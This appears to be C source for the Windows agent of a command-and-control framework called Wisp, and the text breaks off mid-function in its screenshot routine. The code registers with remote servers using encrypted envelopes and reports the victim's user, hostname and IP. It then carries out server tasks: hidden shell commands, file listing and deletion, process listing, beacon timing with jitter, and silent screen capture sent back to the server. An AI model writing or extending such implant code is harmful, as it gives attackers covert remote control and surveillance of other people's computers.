#include "WispAgent.h"
#include "WispDefines.h"
#include "WispHttp.h"
#include "WispRcp.h"
#include "WispCrypto.h"
#include "WispPlugin.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Encoders.h"

#if defined(DEBUG)
static void wisp_wlog(const char* s)
{
	HANDLE h = GetStdHandle(STD_ERROR_HANDLE);
	DWORD w = 0;
	if (h && h != INVALID_HANDLE_VALUE)
		WriteFile(h, s, StrLenA((CHAR*)s), &w, NULL);
}
#define WLOG(...) do { char __lb[512]; if (ApiWin && ApiWin->snprintf) { ApiWin->snprintf(__lb, sizeof(__lb), __VA_ARGS__); wisp_wlog(__lb); } } while (0)
#define WRAW(s) wisp_wlog(s)
// heap health check: reports the first corrupted stage
#define WHV(tag) do { char __hb[128]; if (ApiWin && ApiWin->snprintf) { ApiWin->snprintf(__hb, sizeof(__hb), "[heap] %s %s\n", tag, HeapValidate(GetProcessHeap(), 0, NULL) ? "ok" : "CORRUPT"); wisp_wlog(__hb); } } while (0)
#else
#define WRAW(s) do { } while (0)
#define WLOG(...) do { } while (0)
#define WHV(tag) do { } while (0)
#endif

static char g_rcpAddr[256];
static char g_rcpToken[128];
static char g_agentIdHex[17];

static void wisp_copy_str(char* dst, ULONG cap, const char* src)
{
	ULONG i = 0;
	if (!dst || cap == 0)
		return;
	if (src) {
		while (src[i] && i + 1 < cap) {
			dst[i] = src[i];
			i++;
		}
	}
	dst[i] = 0;
}

//////// small helpers ////////

static char* wisp_b64(const BYTE* in, ULONG len)
{
	return b64_encode(in, (int)len);
}

// decode base64 into a fresh heap buffer
static BYTE* wisp_b64d(const char* in, ULONG* outLen)
{
	if (!in)
		return NULL;
	ULONG n = b64_decoded_size(in);
	BYTE* out = (BYTE*)MemAllocLocal(n + 1);
	if (!out)
		return NULL;
	if (!b64_decode(in, out, (int)n + 1)) {
		MemFreeLocal((LPVOID*)&out, n + 1);
		return NULL;
	}
	*outLen = n;
	return out;
}

static void wisp_hex(const BYTE* in, ULONG n, char* out)
{
	const char* d = "0123456789abcdef";
	for (ULONG i = 0; i < n; i++) {
		out[i * 2] = d[in[i] >> 4];
		out[i * 2 + 1] = d[in[i] & 0xF];
	}
	out[n * 2] = 0;
}

static const char* wj_str(WJVal* v)
{
	return v && v->type == WJ_STR ? v->str : NULL;
}

//////// envelope send/recv ////////

// POST the envelope; parse the JSON response envelope {v,t,a,d}.
static WJVal* wisp_exchange(const WispConfig* cfg, const WJVal* env)
{
	char* json = WJSerialize(env);
	if (!json)
		return NULL;
	WJVal* resp = NULL;
	for (ULONG i = 0; i < cfg->serversCount; i++) {
		resp = WispTransportExchange(cfg, cfg->servers[i], json);
		if (resp)
			break;
		WLOG("[wisp] exchange: transport failed (%s)\n", cfg->servers[i]);
	}
	ULONG jl = StrLenA(json);
	MemFreeLocal((LPVOID*)&json, jl + 1);
	// validate envelope shape
	if (resp) {
		WJVal* v = WJObjGet(resp, "v");
		if (!v || v->type != WJ_NUM || (LONG64)v->num != WISP_PROTOCOL_VERSION) {
			WJFree(resp);
			return NULL;
		}
	}
	return resp;
}

static WJVal* wisp_env_new(const char* type, const char* agent, WJVal* data)
{
	WJVal* env = WJNewObj();
	if (!env)
		return NULL;
	if (!WJObjPutNum(env, "v", WISP_PROTOCOL_VERSION) ||
		!WJObjPutStr(env, "t", type) ||
		(agent && !WJObjPutStr(env, "a", agent)) ||
		(data && !WJObjPut(env, "d", data))) {
		WJFree(env);
		return NULL;
	}
	return env;
}

static WJVal* wisp_env_sealed(const char* type, const char* agent, const WispSessionKey* sk, WJVal* payload)
{
	char* inner = WJSerialize(payload);
	WJFree(payload);
	if (!inner)
		return NULL;
	ULONG n = StrLenA(inner);
	ULONG cap = WISP_IV_SIZE + n + WISP_HMAC_SIZE;
	BYTE* buf = (BYTE*)MemAllocLocal(cap);
	ULONG sealedLen = 0;
	BOOL ok = buf && WispSeal(sk, (const BYTE*)inner, n, buf, cap, &sealedLen);
	ULONG il = n;
	MemFreeLocal((LPVOID*)&inner, il + 1);
	if (!ok) {
		if (buf) MemFreeLocal((LPVOID*)&buf, cap);
		return NULL;
	}
	char* b64 = wisp_b64(buf, sealedLen);
	MemFreeLocal((LPVOID*)&buf, cap);
	if (!b64)
		return NULL;
	WJVal* d = WJNewStr(b64);
	ULONG bl = StrLenA(b64);
	MemFreeLocal((LPVOID*)&b64, bl + 1);
	if (!d)
		return NULL;
	return wisp_env_new(type, agent, d);
}

// unseal the "d" field of an envelope into a parsed value
static WJVal* wisp_env_open(WJVal* env, const WispSessionKey* sk)
{
	WJVal* d = WJObjGet(env, "d");
	const char* b64 = wj_str(d);
	if (!b64)
		return NULL;
	ULONG n = 0;
	BYTE* blob = wisp_b64d(b64, &n);
	if (!blob)
		return NULL;
	BYTE* plain = (BYTE*)MemAllocLocal(n + 1);
	if (!plain) {
		MemFreeLocal((LPVOID*)&blob, n + 1);
		return NULL;
	}
	ULONG plainLen = 0;
	BOOL ok = WispOpen(sk, blob, n, plain, n, &plainLen);
	MemFreeLocal((LPVOID*)&blob, n + 1);
	if (!ok) {
		MemFreeLocal((LPVOID*)&plain, n + 1);
		return NULL;
	}
	plain[plainLen] = 0;
	WJVal* v = WJParse((const char*)plain, plainLen);
	MemFreeLocal((LPVOID*)&plain, n + 1);
	return v;
}

//////// host info ////////

static void wisp_sysinfo(WJVal* sys)
{
	char** nothing = NULL;
	(void)nothing;
	CHAR* user = _GetUserName();
	CHAR* host = _GetHostName();
	CHAR* proc = _GetProcessName();

	WJObjPutStr(sys, "hostname", host ? host : "");
	WJObjPutStr(sys, "os", "windows");
#ifdef _WIN64
	WJObjPutStr(sys, "arch", "amd64");
#else
	WJObjPutStr(sys, "arch", "386");
#endif
	WJObjPutStr(sys, "user", user ? user : "");
	WJObjPutNum(sys, "pid", (double)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueProcess);
	WJObjPutStr(sys, "process", proc ? proc : "");
	WJObjPutStr(sys, "agent_ver", WISP_AGENT_VER);

	ULONG ip = GetInternalIpLong();
	if (ip) {
		char ipa[16];
		ApiWin->snprintf(ipa, sizeof(ipa), "%u.%u.%u.%u",
			ip & 0xFF, (ip >> 8) & 0xFF, (ip >> 16) & 0xFF, (ip >> 24) & 0xFF);
		WJObjPutStr(sys, "internal_ip", ipa);
	}

	if (user) MemFreeLocal((LPVOID*)&user, StrLenA(user) + 1);
	if (host) MemFreeLocal((LPVOID*)&host, StrLenA(host) + 1);
	if (proc) {
		ULONG pl = StrLenA(proc);
		MemFreeLocal((LPVOID*)&proc, pl + 1);
	}
}

//////// registration ////////

static BOOL wisp_register(const WispConfig* cfg, char* agentIdHex, WispSessionKey* sk)
{
	WLOG("[wisp] register: entry\n");
	// agent id: 8 random bytes hex (16 chars)
	BYTE rid[8];
	if (!WispRandom(rid, sizeof(rid)))
		return FALSE;
	wisp_hex(rid, 8, agentIdHex);
	wisp_copy_str(g_agentIdHex, sizeof(g_agentIdHex), agentIdHex);
	WLOG("[wisp] register: agentId=%s\n", agentIdHex);

	// fresh session key
	if (!WispRandom((BYTE*)sk, sizeof(*sk)))
		return FALSE;

	// fetch server pubkey (plain envelope, no agent)
	WJVal* env = wisp_env_new(WISP_MSG_PUBKEY, "", NULL);
	if (!env)
		return FALSE;
	WJVal* resp = wisp_exchange(cfg, env);
	WJFree(env);
	if (!resp) {
		WLOG("[wisp] pubkey exchange failed\n");
		return FALSE;
	}
	WJVal* d = WJObjGet(resp, "d");
	const char* pem = wj_str(WJObjGet(d, "pem"));
	BOOL ok = FALSE;
	if (pem) {
		BYTE* der = NULL;
		ULONG derLen = 0;
		if (WispPemToDer(pem, &der, &derLen)) {
			WLOG("[wisp] pubkey der %u bytes\n", derLen);
			BYTE wrapped[1024];
			ULONG wrappedLen = 0;
			if (WispRsaOaepWrap(der, derLen, (const BYTE*)sk, sizeof(*sk), wrapped, sizeof(wrapped), &wrappedLen)) {
				WLOG("[wisp] session key wrapped (%u bytes)\n", wrappedLen);
				// RegisterInfo JSON
				WJVal* reg = WJNewObj();
				WJVal* sys = WJNewObj();
				wisp_sysinfo(sys);
				char* wk64 = wisp_b64(wrapped, wrappedLen);
				BYTE proof[32];
				char proof64[64];
				BOOL haveProof = WispPskProof(cfg->psk, agentIdHex, sk->id, WISP_KEYID_SIZE, proof);
				if (haveProof) {
					char* p64 = wisp_b64(proof, 32);
					if (p64) {
						memcpy(proof64, p64, 64);
						proof64[44] = 0;
						ULONG pl = StrLenA(p64);
						MemFreeLocal((LPVOID*)&p64, pl + 1);
					}
					else haveProof = FALSE;
				}
				if (reg && sys && wk64 && haveProof &&
					WJObjPutStr(reg, "agent", agentIdHex) &&
					WJObjPut(reg, "system", sys) &&
					WJObjPutStr(reg, "wk", wk64) &&
					WJObjPutStr(reg, "psk", proof64)) {
					env = wisp_env_new(WISP_MSG_REGISTER, agentIdHex, reg);
					WJVal* r2 = wisp_exchange(cfg, env);
					WJFree(env);
				if (r2) {
					WJVal* ack = WJObjGet(r2, "d");
					WJVal* okv = WJObjGet(ack, "ok");
					if (okv && okv->type == WJ_BOOL && okv->b) {
						ok = TRUE;
						WJVal* ra = WJObjGet(ack, "rcp_addr");
						WJVal* rt = WJObjGet(ack, "rcp_token");
						if (ra && ra->type == WJ_STR)
							wisp_copy_str(g_rcpAddr, sizeof(g_rcpAddr), ra->str);
						if (rt && rt->type == WJ_STR)
							wisp_copy_str(g_rcpToken, sizeof(g_rcpToken), rt->str);
						WLOG("[wisp] register ack ok\n");
					}
					else {
						WJVal* reason = WJObjGet(ack, "reason");
						WLOG("[wisp] register rejected: %s\n", reason && reason->type == WJ_STR ? reason->str : "?");
					}
					WJFree(r2);
				}
				else {
					WLOG("[wisp] register exchange failed\n");
				}
				}
				else {
					if (reg) WJFree(reg);
					if (sys) WJFree(sys);
				}
				if (wk64) {
					ULONG wl = StrLenA(wk64);
					MemFreeLocal((LPVOID*)&wk64, wl + 1);
				}
			}
			MemFreeLocal((LPVOID*)&der, derLen);
		}
	}
	WJFree(resp);
	if (!ok)
		WLOG("[wisp] register: pem=%s derOk pending\n", pem ? "yes" : "no");
	return ok;
}

//////// task execution ////////

typedef struct {
	BOOL  quit;
	ULONG sleepMS;
	ULONG jitterPct;
} TaskOutcome;

// run `cmd /C command` capturing combined output (runs hidden).
static BOOL wisp_run_shell(const char* command, ULONG timeoutMs, char** out, ULONG* outLen, int* exitCode)
{
	*out = NULL;
	*outLen = 0;
	*exitCode = 0;

	SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
	HANDLE outR = NULL, outW = NULL;
	if (!ApiWin->CreatePipe(&outR, &outW, &sa, 0))
		return FALSE;

	CHAR cmdb[MAX_PATH];
	// %WINDIR%\system32\cmd.exe (x64 process: system32; x86 on x64 OS: sysnative via Wow64)
	CHAR sysDir[MAX_PATH];
	ApiWin->GetWindowsDirectoryA(sysDir, MAX_PATH);
#ifdef _WIN64
	int w = ApiWin->snprintf(cmdb, sizeof(cmdb), "%s\\system32\\cmd.exe", sysDir);
#else
	// 32-bit process on 64-bit OS: system32 redirects to SysWOW64 cmd (still works)
	int w = ApiWin->snprintf(cmdb, sizeof(cmdb), "%s\\system32\\cmd.exe", sysDir);
#endif
	if (w <= 0) {
		ApiWin->CloseHandle(outW);
		ApiWin->CloseHandle(outR);
		return FALSE;
	}

	// NUL device as stdin (STARTF_USESTDHANDLES needs a valid handle)
	SECURITY_ATTRIBUTES saNul = { sizeof(saNul), NULL, TRUE };
	HANDLE nulR = ApiWin->CreateFileA((LPCSTR)"NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
		&saNul, OPEN_EXISTING, 0, NULL);

	STARTUPINFOA si;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = outW;
	si.hStdError = outW;
	si.hStdInput = (nulR != INVALID_HANDLE_VALUE) ? nulR : NULL;
	PROCESS_INFORMATION pi;
	memset(&pi, 0, sizeof(pi));

	CHAR line[2048];
	w = ApiWin->snprintf(line, sizeof(line), "/C %s", command);
	if (w <= 0)
		w = 0;
	line[sizeof(line) - 1] = 0;
	BOOL created = ApiWin->CreateProcessA(cmdb, line, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (!created)
		WLOG("[wisp] CreateProcessA failed gle=%u cmd=[%s] line=[%s]\n", ApiWin->GetLastError(), cmdb, line);
	WHV("post-create");
	ApiWin->CloseHandle(outW);
	if (nulR != INVALID_HANDLE_VALUE)
		ApiWin->CloseHandle(nulR);
	if (!created) {
		ApiWin->CloseHandle(outR);
		return FALSE;
	}

	// read until EOF or timeout
	ULONG cap = 8192, have = 0;
	BYTE* buf = (BYTE*)MemAllocLocal(cap);
	BOOL truncated = FALSE;
	DWORD start = ApiWin->GetTickCount();
	for (;;) {
		DWORD avail = 0;
		if (!ApiWin->PeekNamedPipe(outR, NULL, 0, NULL, &avail, NULL))
			break;
		if (avail) {
			if (have + avail > cap) {
				ULONG nc = cap;
				while (have + avail > nc)
					nc *= 2;
				// alloc-copy-free: LocalReAlloc(LMEM_MOVEABLE) may return a
				// movable handle instead of a usable pointer
				BYTE* nb = (BYTE*)MemAllocLocal(nc);
				if (!nb) {
					truncated = TRUE;
					break;
				}
				memcpy(nb, buf, have);
				memset(buf, 0, cap);
				MemFreeLocal((LPVOID*)&buf, cap);
				buf = nb;
				cap = nc;
			}
			DWORD got = 0;
			if (!ApiWin->ReadFile(outR, buf + have, avail, &got, NULL) || got == 0)
				break;
			have += got;
			continue;
		}
		if (ApiWin->WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0) {
			// process died: drain once more then stop
			if (!ApiWin->PeekNamedPipe(outR, NULL, 0, NULL, &avail, NULL) || avail == 0)
				break;
		}
		if (timeoutMs && ApiWin->GetTickCount() - start > timeoutMs) {
			ApiWin->TerminateProcess(pi.hProcess, 1);
			break;
		}
	}
	DWORD code = 0;
	ApiWin->GetExitCodeProcess(pi.hProcess, &code);
	*exitCode = (int)code;
	ApiWin->CloseHandle(pi.hThread);
	ApiWin->CloseHandle(pi.hProcess);
	WHV("post-close-handles");

	if (!buf || truncated) {
		if (buf) MemFreeLocal((LPVOID*)&buf, cap);
		ApiWin->CloseHandle(outR);
		return FALSE;
	}
	ApiWin->CloseHandle(outR);
	*out = (char*)buf;
	*outLen = have;
	return TRUE;
}

static void wisp_task_sysinfo(WJVal* res)
{
	WJVal* sys = WJNewObj();
	wisp_sysinfo(sys);
	char* json = WJSerialize(sys);
	WJFree(sys);
	if (json) {
		WJObjPutStr(res, "output", json);
		ULONG jl = StrLenA(json);
		MemFreeLocal((LPVOID*)&json, jl + 1);
	}
}

static void wisp_task_pwd(WJVal* res)
{
	CHAR dir[MAX_PATH];
	ULONG n = ApiWin->GetCurrentDirectoryA(MAX_PATH, dir);
	if (n && n < MAX_PATH) {
		dir[n] = 0;
		WJObjPutStr(res, "output", dir);
	}
	else {
		WJObjPutStr(res, "output", "pwd: failed");
	}
}

static void wisp_task_ls(WJVal* res, WJVal* args)
{
	const char* path = wj_str(WJObjGet(args, "path"));
	CHAR dir[MAX_PATH];
	if (path && path[0]) {
		ULONG n = StrLenA((CHAR*)path);
		if (n >= MAX_PATH) {
			WJObjPutStr(res, "output", "ls: path too long");
			return;
		}
		memcpy(dir, path, n + 1);
	}
	else {
		ULONG n = ApiWin->GetCurrentDirectoryA(MAX_PATH, dir);
		if (!n) {
			WJObjPutStr(res, "output", "ls: getcwd failed");
			return;
		}
		dir[n] = 0;
	}

	CHAR pattern[MAX_PATH + 4];
	ULONG n = StrLenA(dir);
	memcpy(pattern, dir, n);
	pattern[n] = '\\'; pattern[n + 1] = '*'; pattern[n + 2] = 0;

	WJVal* entries = WJNewArr();
	WIN32_FIND_DATAA fd;
	HANDLE h = ApiWin->FindFirstFileA(pattern, &fd);
	if (h != INVALID_HANDLE_VALUE) {
		do {
			if (StrCmpA(fd.cFileName, ".") == 0 || StrCmpA(fd.cFileName, "..") == 0)
				continue;
			WJVal* e = WJNewObj();
			if (!e) break;
			BOOL isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
			ULONG64 size = ((ULONG64)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
			ULARGE_INTEGER ft;
			ft.LowPart = fd.ftLastWriteTime.dwLowDateTime;
			ft.HighPart = fd.ftLastWriteTime.dwHighDateTime;
			LONG64 unix = (LONG64)((ft.QuadPart - 116444736000000000ULL) / 10000000ULL);
			WJObjPutStr(e, "name", fd.cFileName);
			WJObjPutNum(e, "dir", isDir ? 1 : 0);
			WJObjPutNum(e, "size", (double)size);
			WJObjPutNum(e, "mtime", (double)unix);
			WJArrPush(entries, e);
		} while (ApiWin->FindNextFileA(h, &fd));
		ApiWin->FindClose(h);
	}
	else {
		WJFree(entries);
		WJObjPutStr(res, "output", "ls: cannot open directory");
		return;
	}
	WJVal* root = WJNewObj();
	WJObjPutStr(root, "path", dir);
	WJObjPut(root, "entries", entries);
	char* json = WJSerialize(root);
	WJFree(root);
	if (json) {
		WJObjPutStr(res, "output", json);
		ULONG jl = StrLenA(json);
		MemFreeLocal((LPVOID*)&json, jl + 1);
	}
}

static void wisp_task_mkdir(WJVal* res, WJVal* args)
{
	const char* path = wj_str(WJObjGet(args, "path"));
	if (!path || !path[0]) {
		WJObjPutStr(res, "output", "mkdir: empty path");
		return;
	}
	if (ApiWin->CreateDirectoryA(path, NULL))
		WJObjPutStr(res, "output", "ok");
	else if (ApiWin->GetLastError() == ERROR_ALREADY_EXISTS)
		WJObjPutStr(res, "output", "ok");
	else
		WJObjPutStr(res, "output", "mkdir: failed");
}

static void wisp_task_rm(WJVal* res, WJVal* args)
{
	const char* path = wj_str(WJObjGet(args, "path"));
	if (!path || !path[0]) {
		WJObjPutStr(res, "output", "rm: refusing empty path");
		return;
	}
	DWORD attrs = ApiWin->GetFileAttributesA(path);
	BOOL ok;
	if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
		ok = ApiWin->RemoveDirectoryA(path);
	}
	else {
		ok = ApiWin->DeleteFileA(path);
	}
	WJObjPutStr(res, "output", ok ? "ok" : "rm: failed");
}

static void wisp_task_ps(WJVal* res)
{
	// tasklist /FO CSV /NH like agent-go; rows {pid,user,rss_kb,name}
	char* out = NULL;
	ULONG outLen = 0;
	int code = 0;
	WLOG("[wisp] ps: running tasklist\n");
	if (!wisp_run_shell("tasklist /FO CSV /NH", 30000, &out, &outLen, &code) || !out) {
		WLOG("[wisp] ps: tasklist failed\n");
		WJObjPutStr(res, "output", "ps: tasklist failed");
		return;
	}
	WLOG("[wisp] ps: tasklist returned %u bytes\n", outLen);
	ULONG trueCap = outLen + 1;
	WJVal* rows = WJNewArr();
	char* p = out;
	char* endp = out + outLen;
	while (p < endp && rows) {
		char* nl = p;
		while (nl < endp && *nl != '\n')
			nl++;
		// split CSV line respecting quotes
		char* f[8];
		int flen[8];
		int nf = 0;
		BOOL inQ = FALSE;
		char* tokStart = NULL;
		for (char* q = p; q <= nl && nf < 8; q++) {
			char c = (q == nl) ? '\n' : *q;
			if (c == '"') {
				inQ = !inQ;
				if (inQ && !tokStart)
					tokStart = q + 1;
				if (!inQ && tokStart && nf < 8) {
					f[nf] = tokStart;
					flen[nf] = (int)(q - tokStart);
					nf++;
					tokStart = NULL;
				}
			}
			else if (c == ',' && !inQ) {
				if (!tokStart && nf < 8) {
					f[nf] = q;
					flen[nf] = 0;
					nf++;
				}
			}
		}
		if (nf >= 2) {
			// f[0]=name f[1]=pid -> {"pid":N,"ppid":0,"user":"-","rss_kb":0,"name":"..."}
			char name[64];
			ULONG nn = flen[0] < sizeof(name) - 1 ? flen[0] : sizeof(name) - 1;
			memcpy(name, f[0], nn);
			name[nn] = 0;
			LONG pid = 0;
			for (char* q = f[1]; q < f[1] + flen[1]; q++) {
				if (*q >= '0' && *q <= '9')
					pid = pid * 10 + (*q - '0');
			}
			WJVal* row = WJNewObj();
			if (row) {
				WJObjPutNum(row, "pid", (double)pid);
				WJObjPutNum(row, "ppid", 0);
				WJObjPutStr(row, "user", "-");
				WJObjPutNum(row, "rss_kb", 0);
				WJObjPutStr(row, "name", name);
				WJArrPush(rows, row);
			}
			if ((rows->count % 50) == 0)
				WHV("ps-rows");
		}
		p = nl + 1;
	}
	if (rows) {
		WHV("ps-pre-serialize");
		char* json = WJSerialize(rows);
		WHV("ps-post-serialize");
		WJFree(rows);
		WHV("ps-post-rowsfree");
		if (json) {
			WJObjPutStr(res, "output", json);
			ULONG jl = StrLenA(json);
			MemFreeLocal((LPVOID*)&json, jl + 1);
			WHV("ps-post-copyfree");
		}
	}
	ULONG cap = outLen + 1;
	if (out)
		MemFreeLocal((LPVOID*)&out, cap);
	WHV("ps-post-outfree");
}

static void wisp_task_sleep(WispConfig* cfg, WJVal* res, WJVal* args)
{
	WJVal* s = WJObjGet(args, "sleep_ms");
	WJVal* j = WJObjGet(args, "jitter_pct");
	if (s && s->type == WJ_NUM && s->num >= WISP_MIN_SLEEP_MS)
		cfg->sleepMS = (ULONG)s->num;
	if (j && j->type == WJ_NUM && j->num >= 0 && j->num <= WISP_MAX_JITTER_PCT)
		cfg->jitterPct = (ULONG)j->num;
	CHAR msg[64];
	ApiWin->snprintf(msg, sizeof(msg), "sleep=%ums jitter=%u%%", cfg->sleepMS, cfg->jitterPct);
	WJObjPutStr(res, "output", msg);
}

// execute one task; fills res {task_id, ok, exit, output} + outcome
//////// screenshot (CmdScreenshot=25) ////////

typedef struct { UINT32 GdiplusVersion; void* DebugEventCallback; BOOL SuppressBackgroundThread; BOOL SuppressExternalCodecs; } WISP_GDIPSTARTUP;
typedef HDC(WINAPI* PFN_GetDC)(HWND);
typedef int(WINAPI* PFN_ReleaseDC)(HWND, HDC);
typedef int(WINAPI* PFN_GetDeviceCaps)(HDC, int);
typedef HDC(WINAPI* PFN_CreateCompatibleDC)(HDC);
typedef HBITMAP(WINAPI* PFN_CreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ(WINAPI* PFN_SelectObject)(HDC, HGDIOBJ);
typedef BOOL(WINAPI* PFN_BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef BOOL(WINAPI* PFN_DeleteDC)(HDC);
typedef BOOL(WINAPI* PFN_DeleteObject)(HGDIOBJ);
typedef int(WINAPI* PFN_GdiplusStartup)(ULONG_PTR*, const WISP_GDIPSTARTUP*, void*);
typedef void(WINAPI* PFN_GdiplusShutdown)(ULONG_PTR);
typedef int(WINAPI* PFN_GdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, void**);
typedef int(WINAPI* PFN_GdipSaveImageToFile)(void*, const WCHAR*, const GUID*, const void*);
typedef int(WINAPI* PFN_GdipDisposeImage)(void*);

static const GUID kWispJpegClsid = { 0x557CF401, 0x1A04, 0x11D3, { 0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E } };

static BOOL wisp_task_screenshot(WJVal* res)
{
	HMODULE u32 = NULL, g32 = NULL, gp = NULL;
	PFN_GetDC pGetDC = NULL;
	PFN_ReleaseDC pReleaseDC = NULL;
	PFN_GetDeviceCaps pGetDeviceCaps = NULL;
	PFN_CreateCompatibleDC pCreateCompatibleDC = NULL;
	PFN_CreateCompatibleBitmap pCreateCompatibleBitmap = NULL;
	PFN_SelectObject pSelectObject = NULL;
	PFN_BitBlt pBitBlt = NULL;
	PFN_DeleteDC pDeleteDC = NULL;
	PFN_DeleteObject pDeleteObject = NULL;
	PFN_GdiplusStartup pGdiplusStartup = NULL;
	PFN_GdiplusShutdown pGdiplusShutdown = NULL;
	PFN_GdipCreateBitmapFromHBITMAP pGdipCreateBitmapFromHBITMAP = NULL;
	PFN_GdipSaveImageToFile pGdipSaveImageToFile = NULL;
	PFN_GdipDisposeImage pGdipDisposeImage = NULL;
	WISP_GDIPSTARTUP gsi;
	ULONG_PTR token = 0;
	BOOL gdipStarted = FALSE;
	HDC hScreen = NULL, hMem = NULL;
	HBITMAP hbm = NULL;
	HGDIOBJ oldObj = NULL;
	void* img = NULL;
	HANDLE f = INVALID_HANDLE_VALUE;
	char tmp[MAX_PATH], file[MAX_PATH];
	WCHAR wfile[MAX_PATH];
	BYTE* buf = NULL;
	char* b64 = NULL;
	char* uri = NULL;
	DWORD sz = 0, got = 0;
	int w = 0, h = 0;
	ULONG bl, i;
	static const char* prefix = "data:image/jpeg;base64,";
	BOOL ok = FALSE;

	memset(tmp, 0, sizeof(tmp));
	memset(file, 0, sizeof(file));
	memset(&gsi, 0, sizeof(gsi));
	gsi.GdiplusVersion = 1;

	u32 = ApiWin->LoadLibraryA("user32.dll");
	g32 = ApiWin->LoadLibraryA("gdi32.dll");
	gp = ApiWin->LoadLibraryA("gdiplus.dll");
	if (!u32 || !g32 || !gp || !ApiWin->GetProcAddress)
		goto done;
	pGetDC = (PFN_GetDC)ApiWin->GetProcAddress(u32, "GetDC");
	pReleaseDC = (PFN_ReleaseDC)ApiWin->GetProcAddress(u32, "ReleaseDC");
	pGetDeviceCaps = (PFN_GetDeviceCaps)ApiWin->GetProcAddress(g32, "GetDeviceCaps");
	pCreateCompatibleDC = (PFN_CreateCompatibleDC)ApiWin->GetProcAddress(g32, "CreateCompatibleDC");
	pCreateCompatibleBitmap = (PFN_CreateCompatibleBitmap)ApiWin->GetProcAddress(g32, "CreateCompatibleBitmap");
	pSelectObject = (PFN_SelectObject)ApiWin->GetProcAddress(g32, "SelectObject");
	pBitBlt = (PFN_BitBlt)ApiWin->GetProcAddress(g32, "BitBlt");
	pDeleteDC = (PFN_DeleteDC)ApiWin->GetProcAddress(g32, "DeleteDC");
	pDeleteObject = (PFN_DeleteObject)ApiWin->GetProcAddress(g32, "DeleteObject");
	pGdiplusStartup = (PFN_GdiplusStartup)ApiWin->GetProcAddress(gp, "GdiplusStartup");
	pGdiplusShutdown = (PFN_GdiplusShutdown)ApiWin->GetProcAddress(gp, "GdiplusShutdown");
	pGdipCreateBitmapFromHBITMAP = (PFN_GdipCreateBitmapFromHBITMAP)ApiWin->GetProcAddress(gp, "GdipCreateBitmapFromHBITMAP");
	pGdipSaveImageToFile = (PFN_GdipSaveImageToFile)ApiWin->GetProcAddress(gp, "GdipSaveImageToFile");
	pGdipDisposeImage = (PFN_GdipDisposeImage)ApiWin->GetProcAddress(gp, "GdipDisposeImage");
	if (!pGetDC || !pReleaseDC || !pGetDeviceCaps || !pCreateCompatibleDC ||
		!pCreateCompatibleBitmap || !pSelectObject || !pBitBlt || !pDeleteDC ||
		!pDeleteObject || !pGdiplusStartup || !pGdiplusShutdown ||
		!pGdipCreateBitmapFromHBITMAP || !pGdipSaveImageToFile || !pGdipDisposeImage)
		goto done;

	if (pGdiplusStartup(&token, &gsi, NULL) != 0)
		goto done;
	gdipStarted = TRUE;

	GetTempPathA(MAX_PATH, tmp);
	{
		ULONG n = StrLenA(tmp);
		const char* name = "wisp-shot-";
		const char* ext = ".jpg";
		ULONG t = ApiWin->GetTickCount();
		char num[16];
		int ni = 0;
		do { num[ni++] = (char)('0' + (t % 10)); t /= 10; } while (t && ni < 15);
		for (i = 0; tmp[i] && i + 1 < sizeof(file); i++)
			file[i] = tmp[i];
		for (ULONG k = 0; name[k] && i + 1 < sizeof(file); k++)
			file[i++] = name[k];
		while (ni)
			file[i++] = num[--ni];
		for (ULONG k = 0; ext[k] && i + 1 < sizeof(file); k++)
			file[i++] = ext[k];
		file[i] = 0;
		(void)n;
	}
	if (!ApiWin->MultiByteToWideChar ||
		ApiWin->MultiByteToWideChar(CP_ACP, 0, file, -1, wfile, MAX_PATH) <= 0)
		goto done;

	hScreen = pGetDC(NULL);
	if (!hScreen)
		goto done;
	w = pGetDeviceCaps(hScreen, 8);  // HORZRES
	h = pGetDeviceCaps(hScreen, 10); // VERTRES
	if (w <= 0 || h <= 0)
		goto done;
	hMem = pCreateCompatibleDC(hScreen);
	if (!hMem)
		goto done;
	hbm = pCreateCompatibleBitmap(hScreen, w, h);
	if (!hbm)
		goto done;
	oldObj = pSelectObject(hMem, hbm);
	if (!pBitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, 0x00CC0020))
		goto done;
	if (pGdipCreateBitmapFromHBITMAP(hbm, NULL, &img) != 0 || !img)
		goto done;
	if (pGdipSaveImageToFile(img, wfile, &kWispJpegClsid, NULL) != 0)
		goto done;

	f = ApiWin->CreateFileA(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		goto done;
	sz = ApiWin->GetFileSize(f, NULL);
	if (sz == 0 || sz == INVALID_FILE_SIZE || sz > (8u * 1024u * 1024u))
		goto done;
	buf = (BYTE*)MemAllocLocal(sz);
	if (!buf)
		goto done;
	if (!ApiWin->ReadFile(f, buf, sz, &got, NULL) || got != sz)
		goto done;
	b64 = b64_encode(buf, (int)sz);
	if (!b64)
		goto done;
	bl = StrLenA(b64);
	uri = (char*)MemAllocLocal(23 + bl + 1);
	if (!uri)
		goto done;
	memcpy(uri, prefix, 23);
	memcpy(uri + 23, b64, bl);
	uri[23 + bl] = 0;
	{
		WJVal* out = WJNewObj();
		if (!out)
			goto done;
		if (!WJObjPutStr(out, "img", uri)) {
			WJFree(out);
			goto done;
		}
		char* js = WJSerialize(out);
		WJFree(out);
		if (!js)
			goto done;
		WJVal* s = WJNewStr(js);
		ULONG jl = StrLenA(js);
		MemFreeLocal((LPVOID*)&js, jl + 1);
		if (!s)
			goto done;
